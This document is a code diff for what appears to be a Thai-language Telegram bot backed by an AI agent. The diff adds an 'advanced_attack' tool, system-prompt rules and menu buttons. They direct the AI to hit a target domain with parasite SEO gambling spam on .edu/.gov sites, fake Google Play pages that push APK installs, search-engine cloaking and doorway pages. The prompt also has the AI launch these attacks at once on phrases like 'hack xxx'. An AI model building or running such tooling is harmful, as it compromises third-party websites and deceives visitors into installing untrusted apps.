@@ -788,6 +788,28 @@ const AI_TOOLS: Tool[] = [
       },
     },
   },
+  {
+    type: "function",
+    function: {
+      name: "advanced_attack",
+      description: "โจมตีด้วยเทคนิคขั้นสูง — Parasite SEO, Google Play Impersonation, Cloaking, Doorway Pages, APK Distribution (เทคนิคจริงจากการวิเคราะห์ qec.numl.edu.pk)",
+      parameters: {
+        type: "object",
+        properties: {
+          domain: { type: "string", description: "โดเมนเป้าหมาย" },
+          redirect_url: { type: "string", description: "URL ปลายทาง (เว็บพนัน)" },
+          technique: {
+            type: "string",
+            enum: ["parasite_seo", "play_store", "cloaking", "doorway_pages", "apk_distribution", "all"],
+            description: "เทคนิคที่ต้องการใช้ (default: all)",
+          },
+          keywords: { type: "string", description: "keywords เป้าหมาย คั่นด้วย comma (optional)" },
+          doorway_count: { type: "number", description: "จำนวน doorway pages ที่ต้องการสร้าง (default: 50)" },
+        },
+        required: ["domain"],
+      },
+    },
+  },
 ];
 
 // ═══════════════════════════════════════════════════════
@@ -1270,6 +1292,90 @@ async function executeTool(name: string, args: Record<string, any>): Promise<str
           `Agents:\n${agents.join("\n")}`;
       }
 
+      case "advanced_attack": {
+        const domain = args.domain;
+        const redirectUrl = args.redirect_url || "https://gambling-site.example.com";
+        const technique = args.technique || "all";
+        const keywords = args.keywords ? args.keywords.split(",").map((k: string) => k.trim()) : undefined;
+        const doorwayCount = args.doorway_count || 50;
+
+        if (technique === "all") {
+          // Run all 5 techniques combined
+          const { runAdvancedAttack } = await import("./advanced-attack-engine");
+          const report = await runAdvancedAttack(domain, redirectUrl, {
+            keywords,
+            doorwayCount,
+            useAiAnalysis: true,
+          });
+          const duration = Date.now() - startTime;
+          
+          const techSummaries = report.techniques.map(t => `  • ${t.technique}: ${t.payloads.length} payloads, ${t.totalFiles} files`).join("\n");
+          
+          let result = `⚔️ Advanced Attack รวม 5 เทคนิค บน ${domain}\n\n`;
+          result += `เทคนิคที่ใช้:\n${techSummaries}\n\n`;
+          result += `รวม: ${report.totalPayloads} payloads, ${report.totalFiles} files\n`;
+          result += `⏱ ${formatDuration(duration)}\n`;
+          if (report.aiAnalysis) {
+            result += `\n🤖 AI Analysis:\n${report.aiAnalysis}`;
+          }
+          
+          // Save attack log
+          try {
+            await saveAttackLog({
+              targetDomain: domain,
+              method: "advanced_all",
+              success: report.totalPayloads > 0,
+              durationMs: duration,
+              aiReasoning: `5 techniques: ${report.techniques.map(t => t.technique).join(", ")} | ${report.totalPayloads} payloads, ${report.totalFiles} files`,
+            });
+          } catch (e) { /* ignore log errors */ }
+          
+          return result;
+        } else {
+          // Run single technique
+          const { runSingleAdvancedTechnique, AVAILABLE_ADVANCED_TECHNIQUES } = await import("./advanced-attack-engine");
+          try {
+            const techResult = runSingleAdvancedTechnique(technique, domain, redirectUrl, {
+              keywords,
+              count: doorwayCount,
+            });
+            const duration = Date.now() - startTime;
+            
+            const techInfo = AVAILABLE_ADVANCED_TECHNIQUES.find(t => t.id === technique);
+            let result = `⚔️ ${techInfo?.name || technique} บน ${domain}\n\n`;
+            result += `${techResult.summary}\n`;
+            result += `Payloads: ${techResult.payloads.length}\n`;
+            result += `Files: ${techResult.totalFiles}\n`;
+            result += `⏱ ${formatDuration(duration)}\n\n`;
+            
+            // Show payload details (top 3)
+            const topPayloads = techResult.payloads.slice(0, 3);
+            for (const p of topPayloads) {
+              result += `  • ${p.type}: ${p.description.slice(0, 80)}...\n`;
+              result += `    Risk: ${p.riskLevel}/10 | Stealth: ${p.stealthScore}/10\n`;
+            }
+            if (techResult.payloads.length > 3) {
+              result += `  ... +${techResult.payloads.length - 3} more payloads`;
+            }
+            
+            // Save attack log
+            try {
+              await saveAttackLog({
+                targetDomain: domain,
+                method: `advanced_${technique}`,
+                success: true,
+                durationMs: duration,
+                aiReasoning: `${technique}: ${techResult.payloads.length} payloads, ${techResult.totalFiles} files`,
+              });
+            } catch (e) { /* ignore log errors */ }
+            
+            return result;
+          } catch (err: any) {
+            return `❌ ไม่รู้จักเทคนิค: ${technique}\nเทคนิคที่ใช้ได้: parasite_seo, play_store, cloaking, doorway_pages, apk_distribution, all`;
+          }
+        }
+      }
+
       default:
         return `Unknown tool: ${name}`;
     }
@@ -1303,6 +1409,7 @@ function buildSystemPrompt(context: SystemContext): string {
 - "โจมตี xxx" / "hack xxx" / "เอา xxx ไป" / "take over xxx" → สั่งโจมตี ให้เรียก attack_website
 - "โจมตีหลายเว็บ" / "ลุยเลย" / "หาเป้าหมายให้" → สั่ง mass attack ให้เรียก attack_multiple_websites
 - "สถานะ" / "ตอนนี้เป็นไง" / "อัพเดท" → ถามสถานะรวม ให้ตอบจาก context
+- "advanced" / "เทคนิคขั้นสูง" / "parasite" / "cloaking" / "play store" / "doorway" / "APK" → เรียก advanced_attack
 - "rank เท่าไหร่" / "อันดับ" → เช็ค keyword rank
 - "PBN" / "เว็บเครือข่าย" → เช็ค PBN status
 - "log" / "ดู log" / "ประวัติการโจมตี" / "เคยโจมตียังไง" / "ทำไมล้มเหลว" → ดู attack logs ให้เรียก check_attack_logs
@@ -1316,6 +1423,20 @@ function buildSystemPrompt(context: SystemContext): string {
 
 อย่าพิมพ์ตัวเลือก 1-4 ออกมาเป็น text เด็ดขาด — ให้เรียก tool เลย
 ถ้า user บอกว่า "จัดเลย" "ลุย" "ทำเลย" → เรียก tool ทันที
+
+ถ้า user บอก "advanced" "เทคนิคขั้นสูง" "parasite" "cloaking" "play store" "doorway" "APK" → เรียก advanced_attack
+
+═══ Advanced Attack Techniques ═══
+เทคนิคขั้นสูง 5 วิธี (จากการวิเคราะห์ qec.numl.edu.pk):
+1. Parasite SEO — ฝังเนื้อหาพนันบนเว็บ authority สูง (.edu, .gov) ใช้ DA/DR ดัน ranking
+2. Google Play Impersonation — สร้างหน้าเลียนแบบ Google Play Store + ปุ่ม Install หลอกให้โหลด APK
+3. Cloaking — Googlebot เห็นเนื้อหาพนัน user ปกติเห็นเว็บเดิม (รองรับ PHP/Apache/IIS/JS)
+4. Doorway Pages — สร้าง 50-100+ หน้าสแปม target แต่ละ keyword + internal linking network
+5. APK Distribution — วาง APK download + AppsFlyer tracking + Facebook Pixel + smart banner
+
+ใช้เมื่อ: user บอก "advanced xxx.com" หรือ "ใช้เทคนิคขั้นสูงกับ xxx.com" → เรียก advanced_attack ทันที
+ถ้า user ระบุเทคนิคเฉพาะ ("parasite xxx.com", "cloaking xxx.com") → ใช้ technique parameter
+ถ้าไม่ระบุ → ใช้ technique: "all" (รวม 5 เทคนิค)
 
 หลังจากเรียก tool แล้ว รายงานผล:
 - สถานะ: สำเร็จ/ล้มเหลว/กำลังทำ
@@ -1938,6 +2059,9 @@ async function sendAttackTypeKeyboard(config: TelegramConfig, chatId: number, do
         { text: "\uD83E\uDD16 AI Auto", callback_data: `atk_run:${domain}:agentic_auto` },
       ],
       [
+        { text: "\uD83D\uDCA3 Advanced (5 เทคนิค)", callback_data: `atk_advanced:${domain}` },
+      ],
+      [
         { text: "\u274C ยกเลิก", callback_data: "atk_cancel" },
       ],
     ];
@@ -2120,6 +2244,16 @@ function getAlternativeAttackMethods(failedMethod: string, errorInfo?: { waf?: s
       label: "🔍 Scan Only",
       reason: "สแกนดูช่องโหว่ก่อน เพื่อวางแผนโจมตีใหม่",
       confidence: "high",
+    });
+  }
+
+  // Advanced techniques as alternatives
+  if (!failedMethod.startsWith("advanced_")) {
+    alternatives.push({
+      method: "advanced_all",
+      label: "💣 Advanced (5 เทคนิค)",
+      reason: "Parasite SEO + Play Store + Cloaking + Doorway Pages + APK — เทคนิคขั้นสูงจากการวิเคราะห์เว็บจริง",
+      confidence: hasWaf ? "medium" : "high",
     });
   }
   
@@ -2612,6 +2746,61 @@ async function handleCallbackQuery(cbq: NonNullable<TelegramUpdate["callback_que
           return;
         }
         
+        // atk_advanced:<domain> — show advanced technique selection
+        if (data.startsWith("atk_advanced:")) {
+          const domain = data.replace("atk_advanced:", "");
+          const keyboard = [
+            [
+              { text: "🌐 Parasite SEO", callback_data: `atk_adv_run:${domain}:parasite_seo` },
+              { text: "📱 Play Store", callback_data: `atk_adv_run:${domain}:play_store` },
+            ],
+            [
+              { text: "👻 Cloaking", callback_data: `atk_adv_run:${domain}:cloaking` },
+              { text: "🚪 Doorway Pages", callback_data: `atk_adv_run:${domain}:doorway_pages` },
+            ],
+            [
+              { text: "📦 APK Distribution", callback_data: `atk_adv_run:${domain}:apk_distribution` },
+            ],
+            [
+              { text: "💣 รวมทั้ง 5 เทคนิค", callback_data: `atk_adv_run:${domain}:all` },
+            ],
+            [
+              { text: "⬅️ กลับ", callback_data: `atk_select:${domain}` },
+              { text: "❌ ยกเลิก", callback_data: "atk_cancel" },
+            ],
+          ];
+          const text = `💣 Advanced Attack: ${domain}\n\nเลือกเทคนิค:\n🌐 Parasite SEO — ฝังเนื้อหาพนันบนเว็บ authority สูง\n📱 Play Store — หน้าเลียนแบบ Google Play + Install\n👻 Cloaking — Googlebot เห็นพนัน user เห็นเว็บเดิม\n🚪 Doorway Pages — สร้าง 50+ หน้าสแปม\n📦 APK Distribution — วาง APK + tracking pixel\n💣 รวม 5 เทคนิค — ใช้ทั้งหมดพร้อมกัน`;
+          try {
+            const url = `https://api.telegram.org/bot${config.botToken}/sendMessage`;
+            await fetchWithPoolProxy(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: chatId, text, reply_markup: { inline_keyboard: keyboard } }),
+              signal: AbortSignal.timeout(10000),
+            }, { targetDomain: "api.telegram.org", timeout: 10000 });
+          } catch (e: any) {
+            console.error(`[TelegramAI] Failed to send advanced keyboard: ${e.message}`);
+          }
+          return;
+        }
+
+        // atk_adv_run:<domain>:<technique> — execute advanced attack technique
+        if (data.startsWith("atk_adv_run:")) {
+          const parts = data.split(":");
+          const domain = parts[1];
+          const technique = parts[2];
+          // Send "working" message
+          await sendTelegramReply(config, chatId, `💣 กำลังรัน Advanced Attack: ${technique === "all" ? "รวม 5 เทคนิค" : technique} บน ${domain}...`);
+          // Execute advanced attack
+          try {
+            const result = await executeTool("advanced_attack", { domain, technique });
+            await sendTelegramReply(config, chatId, result);
+          } catch (err: any) {
+            await sendTelegramReply(config, chatId, `❌ Advanced Attack ล้มเหลว: ${err.message}`);
+          }
+          return;
+        }
+
         // atk_run:<domain>:<method> — user selected method, show confirmation
         if (data.startsWith("atk_run:")) {
           const parts = data.split(":");
